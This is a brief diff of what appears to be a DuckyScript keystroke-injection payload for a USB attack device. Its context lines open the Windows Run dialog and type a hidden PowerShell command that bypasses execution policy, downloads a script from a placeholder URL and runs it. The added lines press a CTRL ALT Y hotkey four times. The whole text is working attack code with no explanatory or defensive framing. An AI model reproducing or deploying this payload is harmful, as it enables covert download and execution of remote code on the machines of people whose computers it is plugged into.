@@ -4,3 +4,12 @@ GUI r
 DELAY 500
 STRING conhost powershell -w h -ep bypass wget >>URL<< -o ~/w.ps1; ~/w.ps1;
 ENTER
+
+DELAY 750
+CTRL ALT Y
+DELAY 250
+CTRL ALT Y
+DELAY 250
+CTRL ALT Y
+DELAY 250
+CTRL ALT Y
